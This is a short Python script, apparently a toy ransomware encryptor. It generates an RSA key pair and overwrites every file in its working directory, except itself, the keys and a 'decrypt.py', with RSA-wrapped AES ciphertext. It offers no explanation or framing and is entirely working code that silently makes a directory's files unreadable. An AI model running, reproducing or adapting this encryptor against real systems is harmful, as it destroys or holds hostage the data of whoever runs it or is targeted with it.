import os
from Crypto.PublicKey import RSA
from Crypto.Random import get_random_bytes
from Crypto.Cipher import AES, PKCS1_OAEP

key = RSA.generate(4096)
private_key = key.export_key()
file_out = open("private.pem", "wb")
file_out.write(private_key)
file_out.close()

public_key = key.publickey().export_key()
file_out = open("public_key.pem", "wb")
file_out.write(public_key)
file_out.close()


files = [];

for file in os.listdir():
    if file == "nipnip.py" or file == "private.pem" or file == "public_key.pem" or file == "decrypt.py":
        continue;
    if os.path.isfile(file):
        files.append(file);

for file in files:
    with open(file, "rb") as fl:
        content = fl.read();
    
    with open(file, "wb") as fl:

        recipient_key = RSA.import_key(open("public_key.pem").read())
        session_key = get_random_bytes(16)

        # Encrypt the session key with the public RSA key
        cipher_rsa = PKCS1_OAEP.new(recipient_key)
        enc_session_key = cipher_rsa.encrypt(session_key)

        # Encrypt the data with the AES session key
        cipher_aes = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher_aes.encrypt_and_digest(content)
        [ fl.write(x) for x in (enc_session_key, cipher_aes.nonce, tag, ciphertext) ]
        fl.close()